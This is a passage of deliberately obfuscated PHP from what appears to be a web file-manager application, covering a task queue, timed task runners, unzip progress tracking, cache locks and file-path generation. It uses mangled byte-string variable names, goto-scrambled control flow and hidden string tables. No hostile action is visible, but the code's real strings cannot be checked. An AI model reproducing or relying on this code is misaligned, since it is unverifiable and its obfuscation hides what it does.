explode($DİáôˆÊ§[47], $B„…«ô¬¢ª); if (count($B„…«ô¬¢ª) > 1) { $cã§ùğ÷Ÿ£ .= $DİáôˆÊ§[48] . $B„…«ô¬¢ª[1] . $DİáôˆÊ§[49] . $B„…«ô¬¢ª[0] . $DİáôˆÊ§[50]; } else { $cã§ùğ÷Ÿ£ .= $DİáôˆÊ§[48] . $B„…«ô¬¢ª[0] . $DİáôˆÊ§[50]; } } return $cã§ùğ÷Ÿ£; } } goto DÂ³ºêø…ˆ; CÂˆŸ¤éˆ: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\163\153\121\x75\145\165\145\x4c\x65\x6e\147\x74\x68"; const QUEUE_DATA = "\164\141\163\153\x51\x75\x65\x75\x65\104\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($aÇµÊç¥¦, $fçÈÕÛ®–– = array(), $cîŸí­»ã˜ = '', $EÁöÑ áé = '') { $E²³ĞÅ†¢ =& $_SERVER[Š‰]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($EÁöÑ áé && array_find_by_field(self::$listData, $E²³ĞÅ†¢[92], $EÁöÑ áé)) { return !0; } self::$listData[] = array($E²³ĞÅ†¢[260] => $aÇµÊç¥¦, $E²³ĞÅ†¢[1569] => $fçÈÕÛ®––, $E²³ĞÅ†¢[425] => $cîŸí­»ã˜, $E²³ĞÅ†¢[92] => $EÁöÑ áé); return !0; } public static function addSubmit() { $Bäå ‰† ğ =& $_SERVER[Š‰]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Bäå ‰† ğ[1570] . json_encode_force(array_to_keyvalue(self::$listData, $Bäå ‰† ğ[33], $Bäå ‰† ğ[425])), $Bäå ‰† ğ[1571]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($f°¢ÍÎ¨Ãƒ, $b‘ÓÀ„õà = array(), $dğÕ÷ˆœ†İ = '', $b¦”†îîˆ = '') { goto fµ½¼Ñ°Ã«; fµ½¼Ñ°Ã«: $aÈˆİÅ¯á‰ =& $_SERVER[Š‰]; if (self::count() >= self::MAX_LENGTH) { return !1; } $dÅòÊ©‘ã = self::getAll(); goto AæĞã«ÚÃï; AæĞã«ÚÃï: if ($b¦”†îîˆ && array_find_by_field($dÅòÊ©‘ã, $aÈˆİÅ¯á‰[92], $b¦”†îîˆ)) { return !0; } $dÅòÊ©‘ã[] = array($aÈˆİÅ¯á‰[260] => $f°¢ÍÎ¨Ãƒ, $aÈˆİÅ¯á‰[1569] => $b‘ÓÀ„õà, $aÈˆİÅ¯á‰[425] => $dğÕ÷ˆœ†İ, $aÈˆİÅ¯á‰[92] => $b¦”†îîˆ); write_log($aÈˆİÅ¯á‰[1570] . $dğÕ÷ˆœ†İ, $aÈˆİÅ¯á‰[1571]); goto A¬‰ñİå’Ş; A¬‰ñİå’Ş: self::setAll($dÅòÊ©‘ã); return !0; goto c´­¹òã; c´­¹òã: } public static function run() { goto d²³„£êË‚; E‡ŒÍÍ®ù: return !0; goto Fï§¿ÉŠ½; d²³„£êË‚: $B±ÃŠ¥œº£ =& $_SERVER[Š‰]; $CÃš ‡“áË = self::getAll(); $Eó‚·‡ì¹¡ = array_shift($CÃš ‡“áË); goto b’Ä÷êÂï½; D·©á£¨™: try { Hook::apply($Eó‚·‡ì¹¡[$B±ÃŠ¥œº£[260]], $Eó‚·‡ì¹¡[$B±ÃŠ¥œº£[1569]]); } catch (Exception $Cˆ¢ï•¤°œ) { } $CÇ•ñÀ©Ó… = number_format(timeFloat() - $dÌ™·»ëâè, 3) . $B±ÃŠ¥œº£[1513]; write_log($B±ÃŠ¥œº£[1572] . $Eó‚·‡ì¹¡[$B±ÃŠ¥œº£[425]] . $B±ÃŠ¥œº£[1573] . $CÇ•ñÀ©Ó…, $B±ÃŠ¥œº£[1571]); goto E‡ŒÍÍ®ù; b’Ä÷êÂï½: if (!$Eó‚·‡ì¹¡) { return !1; } self::setAll($CÃš ‡“áË); $dÌ™·»ëâè = timeFloat(); goto D·©á£¨™; Fï§¿ÉŠ½: } public static function count() { $EœËÌˆˆ‘ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$EœËÌˆˆ‘) { return 0; } return intval($EœËÌˆˆ‘); } public static function getAll() { $b·»”æäÈù = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$b·»”æäÈù) { return array(); } return $b·»”æäÈù; } public static function setAll($AØĞ’¯“Êö) { $dº‘ßêÁÙÄ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($AØĞ’¯“Êö), $dº‘ßêÁÙÄ); Cache::set(self::QUEUE_DATA, $AØĞ’¯“Êö, $dº‘ßêÁÙÄ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($AùºÚÜ«Â, $f½ëˆ¡µÁ§ = 5.0) { if (!$AùºÚÜ«Â) { return; } $A›ÎèÓĞ = Cache::get($AùºÚÜ«Â); if (!$A›ÎèÓĞ || timeFloat() - floatVal($A›ÎèÓĞ) >= $f½ëˆ¡µÁ§) { Cache::set($AùºÚÜ«Â, timeFloat(), $f½ëˆ¡µÁ§ * 10); return !0; } return !1; } public static function timeLimitCall($bÍÅÛò‡ç—, $fÔğ„”ö•, $FÛ‡’ó±†¢, $E°†¾ÇÜÛ = 5.0) { goto E×ÓÍ ¨ô¯; e¿õ¶‡Œ¡: if (is_array($Fº“°×Ş¤å[$bÍÅÛò‡ç—])) { $aÍÀ‰„ù´[$Fù×ŞÈ˜£Ş[1576]] = $Fº“°×Ş¤å[$bÍÅÛò‡ç—][$Fù×ŞÈ˜£Ş[1576]]; } if (is_array($Fº“°×Ş¤å[$bÍÅÛò‡ç—])) { if (timeFloat() - $Fº“°×Ş¤å[$bÍÅÛò‡ç—][$Fù×ŞÈ˜£Ş[1575]] < $aÍÀ‰„ù´[$Fù×ŞÈ˜£Ş[195]] * 0.3) { return; } $aÍÀ‰„ù´[$Fù×ŞÈ˜£Ş[1576]] = $Fº“°×Ş¤å[$bÍÅÛò‡ç—][$Fù×ŞÈ˜£Ş[1576]]; } $Fº“°×Ş¤å[$bÍÅÛò‡ç—] = $aÍÀ‰„ù´; goto EëÁ‹Š‘Õ; dÃØÁ“ÑÚ‘: $AŒ™¾‰Ë‹ë = $Fù×ŞÈ˜£Ş[1574]; $Fº“°×Ş¤å = Cache::get($AŒ™¾‰Ë‹ë, !0); $aÍÀ‰„ù´ = array($Fù×ŞÈ˜£Ş[1575] => timeFloat(), $Fù×ŞÈ˜£Ş[1576] => timeFloat(), $Fù×ŞÈ˜£Ş[260] => $fÔğ„”ö•, $Fù×ŞÈ˜£Ş[1569] => $FÛ‡’ó±†¢, $Fù×ŞÈ˜£Ş[195] => $E°†¾ÇÜÛ); goto e¿õ¶‡Œ¡; E×ÓÍ ¨ô¯: $Fù×ŞÈ˜£Ş =& $_SERVER[Š‰]; if (!$bÍÅÛò‡ç— || !$fÔğ„”ö•) { return; } self::$asyncAdd = !0; goto dÃØÁ“ÑÚ‘; EëÁ‹Š‘Õ: Cache::set($AŒ™¾‰Ë‹ë, $Fº“°×Ş¤å, 60); Cache::removeMemory($AŒ™¾‰Ë‹ë); write_log($Fù×ŞÈ˜£Ş[1577] . $bÍÅÛò‡ç— . $Fù×ŞÈ˜£Ş[67] . $fÔğ„”ö•, $Fù×ŞÈ˜£Ş[1571]); goto F¤ñ„ˆÑ; F¤ñ„ˆÑ: } public static function timeLimitCallLoop() { goto eé®ÓÙ¬‡É; b¡ÀÖ¥Ò±²: if (!$eÖÒÃ¿Ç && !self::$asyncAdd) { return; } $f˜¿Æ’Ş¨ = $bÌó™²¸ÎÑ[1574]; $aÓ…è¾õ£™ = Cache::get($f˜¿Æ’Ş¨, !0); goto dÉ‡ª…œ¡; dÉ‡ª…œ¡: if (!$aÓ…è¾õ£™ || count($aÓ…è¾õ£™) <= 0) { return; } $fğ‡¢¬µñ„ = !1; $fŸ‹è¥ëÆÀ = timeFloat(); goto Bˆš·öššç; Bˆš·öššç: $fñÉ†÷•Á¥ = array(); foreach ($aÓ…è¾õ£™ as $Eàã²ÆÆŸÈ => $B­óö´™åŸ) { if ($fŸ‹è¥ëÆÀ - $B­óö´™åŸ[$bÌó™²¸ÎÑ[1576]] > $B­óö´™åŸ[$bÌó™²¸ÎÑ[195]]) { $fğ‡¢¬µñ„ = !0; try { Hook::apply($B­óö´™åŸ[$bÌó™²¸ÎÑ[260]], $B­óö´™åŸ[$bÌó™²¸ÎÑ[1569]]); write_log($bÌó™²¸ÎÑ[1579] . $Eàã²ÆÆŸÈ . $bÌó™²¸ÎÑ[67] . $B­óö´™åŸ[$bÌó™²¸ÎÑ[260]] . $bÌó™²¸ÎÑ[1580] . ACTION, $bÌó™²¸ÎÑ[1571]); } catch (Exception $e¬©Ôí´å£) { } continue; } $fñÉ†÷•Á¥[$Eàã²ÆÆŸÈ] = $B­óö´™åŸ; } if (!$fğ‡¢¬µñ„) { return; } goto d™ Ëãì´Œ; eé®ÓÙ¬‡É: $bÌó™²¸ÎÑ =& $_SERVER[Š‰]; $eßÖø‰ì›Í = array($bÌó™²¸ÎÑ[1578]); $eÖÒÃ¿Ç = in_array(strtolower(ACTION), $eßÖø‰ì›Í); goto b¡ÀÖ¥Ò±²; d™ Ëãì´Œ: if (!$fñÉ†÷•Á¥) { return Cache::remove($f˜¿Æ’Ş¨); } Cache::set($f˜¿Æ’Ş¨, $fñÉ†÷•Á¥, 60); Cache::removeMemory($f˜¿Æ’Ş¨); goto D°­Ú»«Í ; D°­Ú»«Í : } public static function finished($Cò‘®†¬˜±, $cÅ­ÅÉõ…¤) { $dªáÅ›‚ñ =& $_SERVER[Š‰]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($dªáÅ›‚ñ[260] => $Cò‘®†¬˜±, $dªáÅ›‚ñ[1569] => $cÅ­ÅÉõ…¤); } private static function finishedRun() { $B±éùÄ¼ª =& $_SERVER[Š‰]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $dĞ†·ÙÚƒò) { try { Hook::apply($dĞ†·ÙÚƒò[$B±éùÄ¼ª[260]], $dĞ†·ÙÚƒò[$B±éùÄ¼ª[1569]]); } catch (Exception $CŸˆÍâ¢ÛÉ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto dÄñ©Üˆ¢Î; dÄñ©Üˆ¢Î: $F¸ÍÊ–ƒ =& $_SERVER[Š‰]; parent::startAfter(); Hook::bind($F¸ÍÊ–ƒ[1581], array($this, $F¸ÍÊ–ƒ[1582])); goto f›Û¥øá†; d‡‰ˆ¥Õ¿Å: if (!$Dâ÷”Äˆ[$F¸ÍÊ–ƒ[1405]]) { $Dâ÷”Äˆ[$F¸ÍÊ–ƒ[1405]] = LNG($F¸ÍÊ–ƒ[1585]); } goto C¨£ÉæµÍ; f›Û¥øá†: Hook::bind($F¸ÍÊ–ƒ[1065], array($this, $F¸ÍÊ–ƒ[1583])); $Dâ÷”Äˆ =& $this->task; $Dâ÷”Äˆ[$F¸ÍÊ–ƒ[1584]] = $F¸ÍÊ–ƒ[1070]; goto d‡‰ˆ¥Õ¿Å; C¨£ÉæµÍ: } protected function endAfter() { $dçö‘»•Ø =& $_SERVER[Š‰]; parent::endAfter(); Hook::unbind($dçö‘»•Ø[1581], array($this, $dçö‘»•Ø[1582])); Hook::unbind($dçö‘»•Ø[1065], array($this, $dçö‘»•Ø[1583])); } public function updateAfter() { $f‰±ĞğÍ×° =& $_SERVER[Š‰]; $eÅ½êğñÒô =& $this->task; if (!$eÅ½êğñÒô[$f‰±ĞğÍ×°[998]] || !$eÅ½êğñÒô[$f‰±ĞğÍ×°[711]]) { return; } if ($eÅ½êğñÒô[$f‰±ĞğÍ×°[1584]] == $f‰±ĞğÍ×°[1070]) { $E‚¸¦òâÂñ = 0; if ($eÅ½êğñÒô[$f‰±ĞğÍ×°[1543]]) { $E‚¸¦òâÂñ = $eÅ½êğñÒô[$f‰±ĞğÍ×°[1544]] / $eÅ½êğñÒô[$f‰±ĞğÍ×°[1543]]; } $eÅ½êğñÒô[$f‰±ĞğÍ×°[1501]] = $E‚¸¦òâÂñ * 0.3; } else { if ($eÅ½êğñÒô[$f‰±ĞğÍ×°[1584]] == $f‰±ĞğÍ×°[309]) { $E‚¸¦òâÂñ = $eÅ½êğñÒô[$f‰±ĞğÍ×°[1012]] / $eÅ½êğñÒô[$f‰±ĞğÍ×°[998]]; $eÅ½êğñÒô[$f‰±ĞğÍ×°[1501]] = 0.3 + $E‚¸¦òâÂñ * 0.4; } else { if ($eÅ½êğñÒô[$f‰±ĞğÍ×°[1584]] == $f‰±ĞğÍ×°[106]) { $B…Šˆ‡ç›• = 0; if ($eÅ½êğñÒô[$f‰±ĞğÍ×°[1545]] == $f‰±ĞğÍ×°[106]) { $B…Šˆ‡ç›• = $eÅ½êğñÒô[$f‰±ĞğÍ×°[1544]]; } $E‚¸¦òâÂñ = ($eÅ½êğñÒô[$f‰±ĞğÍ×°[1548]] + $B…Šˆ‡ç›•) / $eÅ½êğñÒô[$f‰±ĞğÍ×°[711]]; $eÅ½êğñÒô[$f‰±ĞğÍ×°[1501]] = 0.3 + 0.4 + $E‚¸¦òâÂñ * 0.3; } } } if ($eÅ½êğñÒô[$f‰±ĞğÍ×°[1501]] > 0) { $A«ØÖ‹ĞÅÚ = timeFloat() - $eÅ½êğñÒô[$f‰±ĞğÍ×°[733]] - $eÅ½êğñÒô[$f‰±ĞğÍ×°[1504]]; $eÅ½êğñÒô[$f‰±ĞğÍ×°[1505]] = $A«ØÖ‹ĞÅÚ * (1 - $eÅ½êğñÒô[$f‰±ĞğÍ×°[1501]]) / $eÅ½êğñÒô[$f‰±ĞğÍ×°[1501]]; } } public function addFile($A¸‘Àôƒ‚) { goto FÀ‡¯Î× ; F—í©‡æñâ: $dŸßØÔç†[$b…ƒĞÁ‘[998]] = 1; $cÅƒ›í™…é = 0; $dŸßØÔç†[$b…ƒĞÁ‘[1552]] = array($b…ƒĞÁ‘[1553] => $cÅƒ›í™…é + 1, $b…ƒĞÁ‘[407] => $a„÷—œ”‹”[$b…ƒĞÁ‘[28]], $b…ƒĞÁ‘[75] => $a„÷—œ”‹”[$b…ƒĞÁ‘[75]], $b…ƒĞÁ‘[489] => $a„÷—œ”‹”[$b…ƒĞÁ‘[489]] ? $a„÷—œ”‹”[$b…ƒĞÁ‘[489]] : $a„÷—œ”‹”[$b…ƒĞÁ‘[75]]); goto EšÍ²¹´©ô; EšÍ²¹´©ô: $this->update(); goto Bé‘æ•˜‚; Bèîë„Ò: $dŸßØÔç†[$b…ƒĞÁ‘[1000]] = $b…ƒĞÁ‘[1560]; $dŸßØÔç†[$b…ƒĞÁ‘[1545]] = $b…ƒĞÁ‘[1070]; $dŸßØÔç†[$b…ƒĞÁ‘[711]] = $a„÷—œ”‹”[$b…ƒĞÁ‘[77]]; goto F—í©‡æñâ; FÀ‡¯Î× : $b…ƒĞÁ‘ =& $_SERVER[Š‰]; $dŸßØÔç† =& $this->task; $a„÷—œ”‹” = IO::info($A¸‘Àôƒ‚); goto bî°Ó„×­; bî°Ó„×­: $dŸßØÔç†[$b…ƒĞÁ‘[1541]] = $a„÷—œ”‹”[$b…ƒĞÁ‘[28]]; $dŸßØÔç†[$b…ƒĞÁ‘[1543]] = $a„÷—œ”‹”[$b…ƒĞÁ‘[77]]; $dŸßØÔç†[$b…ƒĞÁ‘[1544]] = 0; goto Bèîë„Ò; Bé‘æ•˜‚: } public function unzipAfter($CÜùÓ‹¦Ò) { goto aéóí“¼ô; bğÕ¿ó¤»: if ($Fæ±Éö±µ[$E¢ …ù±ò¼[29]] == $E¢ …ù±ò¼[173]) { $B†ÈƒàÜ£[$E¢ …ù±ò¼[998]] = 1; } else { $B†ÈƒàÜ£[$E¢ …ù±ò¼[998]] = $Fæ±Éö±µ[$E¢ …ù±ò¼[80]][$E¢ …ù±ò¼[78]]; } $B†ÈƒàÜ£[$E¢ …ù±ò¼[1000]] = $E¢ …ù±ò¼[33]; $B†ÈƒàÜ£[$E¢ …ù±ò¼[1545]] = 0; goto fâ“ö‘Ö; CÏ«ØÕ¥ÂÓ: $this->update(); self::log($E¢ …ù±ò¼[1586] . json_encode(array($B†ÈƒàÜ£, $Fæ±Éö±µ))); goto A÷´Çñ˜½Ñ; aéóí“¼ô: $E¢ …ù±ò¼ =& $_SERVER[Š‰]; $B†ÈƒàÜ£ =& $this->task; $B†ÈƒàÜ£[$E¢ …ù±ò¼[1584]] = $E¢ …ù±ò¼[106]; goto bÃÇ½ƒÆ©Ê; fâ“ö‘Ö: $B†ÈƒàÜ£[$E¢ …ù±ò¼[1012]] = 0; $B†ÈƒàÜ£[$E¢ …ù±ò¼[1543]] = 0; $B†ÈƒàÜ£[$E¢ …ù±ò¼[1544]] = 0; goto bË©ôãë; bË©ôãë: $B†ÈƒàÜ£[$E¢ …ù±ò¼[1541]] = $E¢ …ù±ò¼[33]; $B†ÈƒàÜ£[$E¢ …ù±ò¼[1548]] = 0; $B†ÈƒàÜ£[$E¢ …ù±ò¼[711]] = $Fæ±Éö±µ[$E¢ …ù±ò¼[77]]; goto CÏ«ØÕ¥ÂÓ; bÃÇ½ƒÆ©Ê: $Fæ±Éö±µ = IO::infoWithChildren($CÜùÓ‹¦Ò); $b‡“Š»‹— = 0; $B†ÈƒàÜ£[$E¢ …ù±ò¼[1552]] = array($E¢ …ù±ò¼[1553] => $b‡“Š»‹— + 1, $E¢ …ù±ò¼[407] => $Fæ±Éö±µ[$E¢ …ù±ò¼[28]], $E¢ …ù±ò¼[75] => $Fæ±Éö±µ[$E¢ …ù±ò¼[75]], $E¢ …ù±ò¼[489] => $Fæ±Éö±µ[$E¢ …ù±ò¼[489]] ? $Fæ±Éö±µ[$E¢ …ù±ò¼[489]] : $Fæ±Éö±µ[$E¢ …ù±ò¼[75]]); goto bğÕ¿ó¤»; A÷´Çñ˜½Ñ: } public function nameParse($a˜¢‡áù¡) { goto EÑ¡ç°«Á‰; EÑ¡ç°«Á‰: $aÑà„ß­øÎ =& $_SERVER[Š‰]; $cê‚•âµË­ =& $this->task; if ($cê‚•âµË­[$aÑà„ß­øÎ[1584]] == $aÑà„ß­øÎ[1070]) { $cê‚•âµË­[$aÑà„ß­øÎ[1584]] = $aÑà„ß­øÎ[309]; $cê‚•âµË­[$aÑà„ß­øÎ[1548]] = 0; $cê‚•âµË­[$aÑà„ß­øÎ[711]] = 0; } goto cÉß¾•ÖÄ›; cÉß¾•ÖÄ›: $CºÎµÇ‚Ã¡ = get_path_this($a˜¢‡áù¡); if (strstr($CºÎµÇ‚Ã¡, $aÑà„ß­øÎ[94])) { $cê‚•âµË­[$aÑà„ß­øÎ[1012]] += 1; $cê‚•âµË­[$aÑà„ß­øÎ[998]] += 1; } $cê‚•âµË­[$aÑà„ß­øÎ[1541]] = $a˜¢‡áù¡; goto c±¦»ŠÃ; c±¦»ŠÃ: $this->update(); goto EÙª”»Ë«ò; EÙª”»Ë«ò: } } goto AÇØŞÇ¾; aÜôó•ê—´: class CacheLockMemcached { public function lock($a°õªô±Æ©, $dùĞ®Ğ¬Æã = 0) { $C”ÁçñŠÛÁ = Cache::init(); $d‡â„¶ÑÒ‘ = microtime(!0) + $dùĞ®Ğ¬Æã; while (microtime(!0) < $d‡â„¶ÑÒ‘) { $A—ó¿é´ÃŒ = $C”ÁçñŠÛÁ->get($a°õªô±Æ©); if (!$A—ó¿é´ÃŒ || $A—ó¿é´ÃŒ < microtime(!0)) { $E‰Ğ£›Ş¾‹ = $C”ÁçñŠÛÁ->handle->add($a°õªô±Æ©, $d‡â„¶ÑÒ‘, $dùĞ®Ğ¬Æã); if ($E‰Ğ£›Ş¾‹) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($FóËë¥îˆŸ) { return Cache::init()->get($FóËë¥îˆŸ); } public function unlock($A£¹õÍ÷õ) { return Cache::init()->remove($A£¹õÍ÷õ); } } class CacheLockDatabase { public function lock($fÒÑµ‚, $e¶ƒÇœæÎ¿ = 0) { $A¾‘³ÑôîÌ = Model($_SERVER[Š‰][779]); $cß±ª¯å°´ = microtime(!0) + $e¶ƒÇœæÎ¿; while (microtime(!0) < $cß±ª¯å°´) { $B’Á×“­‚º = $A¾‘³ÑôîÌ->get($fÒÑµ‚); if (!$B’Á×“­‚º || $B’Á×“­‚º < microtime(!0)) { $bÉ¹ÉŞ¸ = $A¾‘³ÑôîÌ->set($fÒÑµ‚, $cß±ª¯å°´); if ($bÉ¹ÉŞ¸) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($FšÃîìˆÌÎ) { return Model($_SERVER[Š‰][779])->get($FšÃîìˆÌÎ); } public function unlock($DùÖƒÏ¿º…) { Model($_SERVER[Š‰][779])->remove($DùÖƒÏ¿º…); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($C¦ëİê¨, $BáôÍôÉÔ) { $dŠË‰ÛŒ„– =& $_SERVER[Š‰]; if (!class_exists($dŠË‰ÛŒ„–[806])) { show_json($dŠË‰ÛŒ„–[807], !1); } $this->cacheTime = $BáôÍôÉÔ; $this->handle = new Memcached(); if (is_array($C¦ëİê¨[$dŠË‰ÛŒ„–[808]]) && count($C¦ëİê¨[$dŠË‰ÛŒ„–[808]]) >= 1) { foreach ($C¦ëİê¨[$dŠË‰ÛŒ„–[808]] as $EÀĞ×ó²Íª) { $f—èÛœ¯Ôæ = explode($dŠË‰ÛŒ„–[4], $EÀĞ×ó²Íª); $this->handle->addServer($f—èÛœ¯Ôæ[0], $f—èÛœ¯Ôæ[1]); } } else { $this->handle->addServer($C¦ëİê¨[$dŠË‰ÛŒ„–[175]], $C¦ëİê¨[$dŠË‰ÛŒ„–[176]]); } } public function set($e£³äì½Ğ, $Fœ˜ğÓÀºÒ, $dô‚¦Šâ„ = false) { $dô‚¦Šâ„ = $dô‚¦Šâ„ ? $dô‚¦Šâ„ : $this->cacheTime; return $this->handle->set($e£³äì½Ğ, $Fœ˜ğÓÀºÒ, $dô‚¦Šâ„); } public function get($AÃÊÒç³ä) { return $this->handle->get($AÃÊÒç³ä); } public function remove($F‰İ²‰½ï­) { return $this->handle->delete($F‰İ²‰½ï­); } public function deleteAll() { return $this->handle->flush(); } } goto e¸À‚µ–ö÷; f¥˜¯ŒªÇò: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\x69\x6c\145"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\x6d\x65" => "\151\x6f\137\x66\151\154\x65\137\155\x65\x74\x61", "\x6d\145\x74\x61\x46\151\145\154\144" => "\x66\151\154\x65\111\104"); public function fileInfo($A‚¦áŒŠÍ) { $bÇËİÏÖì =& $_SERVER[Š‰]; static $BÆšŒÆ¥áÚ = array(); if (!isset($BÆšŒÆ¥áÚ[$A‚¦áŒŠÍ])) { $dÔ¸¿ŸÚ’– = $bÇËİÏÖì[1707]; $AÒŸóß”¡ = Model($bÇËİÏÖì[444])->field($dÔ¸¿ŸÚ’–)->where(array($bÇËİÏÖì[442] => $A‚¦áŒŠÍ))->find(); $BÆšŒÆ¥áÚ[$A‚¦áŒŠÍ] = $AÒŸóß”¡; } return $BÆšŒÆ¥áÚ[$A‚¦áŒŠÍ]; } public function addFileByContent($FÒÇäíîİ = '', $b‚äìÆòŠ­ = '') { goto AšùÈè®ÆÈ; e£ôƒŒÓğ: $fæœ¥ÄêºÔ = $CÀÍ™· Õ . $FŒòÁ¥ºœ[1709] . rand_string(16); file_put_contents($fæœ¥ÄêºÔ, $FÒÇäíîİ); $d½³½«Û¨ = $this->addFile($fæœ¥ÄêºÔ, $b‚äìÆòŠ­, !0); goto AÒÓ¥è†Ñ; AšùÈè®ÆÈ: $FŒòÁ¥ºœ =& $_SERVER[Š‰]; $CÀÍ™· Õ = TEMP_PATH . $FŒòÁ¥ºœ[1708]; if (!is_dir($CÀÍ™· Õ)) { mk_dir($CÀÍ™· Õ); } goto e£ôƒŒÓğ; AÒÓ¥è†Ñ: if (file_exists($fæœ¥ÄêºÔ)) { @unlink($fæœ¥ÄêºÔ); } return $d½³½«Û¨; goto F åãÓªÌ¨; F åãÓªÌ¨: } public function createFileName($dÎöƒ¼²·¿, $CØ¡óƒÜ„¡ = false) { goto A‘É¿ò¡É; aµ¹È”„†¼: if (!$A·‘Ô…¤¹ && !Cache::get($a¶ğìº»•Ï)) { $A·‘Ô…¤¹ = !0; $eªœÎ¤ÖíÜ = IO::mkdir($eĞƒ¶°æ×); if (!IO::exist($eªœÎ¤ÖíÜ . $fô°«ñ—³³[1711])) { IO::mkfile($eªœÎ¤ÖíÜ . $fô°«ñ—³³[1711]); } Cache::set($a¶ğìº»•Ï, 1, 3600 * 2); } return $A×‚®¤¹á›; goto b÷ùÓª‡Ê; A‘É¿ò¡É: $fô°«ñ—³³ =& $_SERVER[Š‰]; $aÂŠÕ’Ø¯· = IO::init($fô°«ñ—³³[8]); $A×‚®¤¹á› = $this->makeFilePath($dÎöƒ¼²·¿, $aÂŠÕ’Ø¯·, $CØ¡óƒÜ„¡); goto a’Å‡²Œ‹È; a’Å‡²Œ‹È: $eĞƒ¶°æ× = $aÂŠÕ’Ø¯·->pathFather($A×‚®¤¹á›); static $A·‘Ô…¤¹ = false; $a¶ğìº»•Ï = $fô°«ñ—³³[1710] . md5($eĞƒ¶°æ×); goto aµ¹È”„†¼; b÷ùÓª‡Ê: } public function makeFilePath($E‘¾µÚ‹¬Ê, $aÀäœÁñ¢‹, $c¿±ˆœ´Ø = false) { goto A­µÕÇçÌ½; A­µÕÇçÌ½: $C†Ú›ÍÃ§» =& $_SERVER[Š‰]; $Añ…£ñ£å… = Model($C†Ú›ÍÃ§»[1100])->get($C†Ú›ÍÃ§»[1712]); $d²˜ºª“ = KodIO::defaultIO() . date($C†Ú›ÍÃ§»[1713]); goto E ÍËÄÆù; D‰‘Ó­Â¸Ş: if (!$E‘¾µÚ‹¬Ê) { $Añ…£ñ£å… = $C†Ú›ÍÃ§»[1714]; } switch ($Añ…£ñ£å…) { case $C†Ú›ÍÃ§»[1715]: $fŒ¹ÄĞÂ« = $fŒ¹ÄĞÂ« . $C†Ú›ÍÃ§»[94] . $aÀäœÁñ¢‹->ext($E‘¾µÚ‹¬Ê); if ($fÀëˆøã´ == $C†Ú›ÍÃ§»[1653]) { $fŒ¹ÄĞÂ« .= $C†Ú›ÍÃ§»[1401]; } break; case $C†Ú›ÍÃ§»[1716]: goto eÂÍ¸ÃŒ÷Ÿ; eÂÍ¸ÃŒ÷Ÿ: $AøÏ…İ¶™“ = Model($C†Ú›ÍÃ§»[1100])->get($C†Ú›ÍÃ§»[1397]); $B­Ê’¿â¢± = substr(md5($C†Ú›ÍÃ§»[1717] . $AøÏ…İ¶™“ . date($C†Ú›ÍÃ§»[700])), 0, 8); $dâÉ·ø·»ˆ = KodIO::defaultDriver(); goto C¢Ï‹‡°Í”; B‚´ÖĞé†±: if (IO::isTypeObject($fŒ¹ÄĞÂ«) && !IO::isUploadServer($fŒ¹ÄĞÂ«)) { $dí—á×‘‡ = IO::setContent($fŒ¹ÄĞÂ«, $C†Ú›ÍÃ§»[33]); if (!$dí—á×‘‡) { show_json($C†Ú›ÍÃ§»[1720], !1); } } CacheLock::unlock($f‚›ğ¼„Òˆ); break; goto d­È¡—Œíõ; C¢Ï‹‡°Í”: $d²˜ºª“ = $C†Ú›ÍÃ§»[1098] . $dâÉ·ø·»ˆ[$C†Ú›ÍÃ§»[388]] . $C†Ú›ÍÃ§»[396] . date($C†Ú›ÍÃ§»[1718]) . $B­Ê’¿â¢± . $C†Ú›ÍÃ§»[8]; if ($fÀëˆøã´ == $C†Ú›ÍÃ§»[1653]) { $E‘¾µÚ‹¬Ê .= $C†Ú›ÍÃ§»[1401]; } $f‚›ğ¼„Òˆ = $C†Ú›ÍÃ§»[1719] . $d²˜ºª“ . $E‘¾µÚ‹¬Ê; goto a®Ïó£•Ü; a®Ïó£•Ü: CacheLock::lock($f‚›ğ¼„Òˆ); $fŒ¹ÄĞÂ« = $d²˜ºª“ . $E‘¾µÚ‹¬Ê; if (IO::exist($d²˜ºª“ . $E‘¾µÚ‹¬Ê)) { $d‚õÄ°»Ã = substr($E‘¾µÚ‹¬Ê, 0, strlen($E‘¾µÚ‹¬Ê) - strlen($fÀëˆøã´)); $fŒ¹ÄĞÂ« = $d²˜ºª“ . $d‚õÄ°»Ã . substr($c¿±ˆœ´Ø, 0, 5) . $C†Ú›ÍÃ§»[94] . $fÀëˆøã´; } goto B‚´ÖĞé†±; d­È¡—Œíõ: case $C†Ú›ÍÃ§»[1714]: break; default: break; } return $fŒ¹ÄĞÂ«; goto dÚÕÒÊ­‡ß; E ÍËÄÆù: $fŒ¹ÄĞÂ« = $d²˜ºª“ . rand_string(5) . short_id(100); $E‘¾µÚ‹¬Ê = str_replace($C†Ú›ÍÃ§»[8], $C†Ú›ÍÃ§»[70], KodIO::clear($E‘¾µÚ‹¬Ê)); $fÀëˆøã´ = $aÀäœÁñ¢‹->ext($E‘¾µÚ‹¬Ê); goto D‰‘Ó­Â¸Ş; dÚÕÒÊ­‡ß: } public function addFileByRemote($fÀõÌ”Âå, $FÂìÉåçŞ›, $c¨ å‹Ë‡Ë = array()) { goto eëï·´¹¥; D´¯ò ™£†: $fæ•»¶èÙš = IO::hashMd5($fÀõÌ”Âå, $FÕÂÊ™¸ö’); $cÈ§Á¢İñ = KodIO::defaultDriver(); 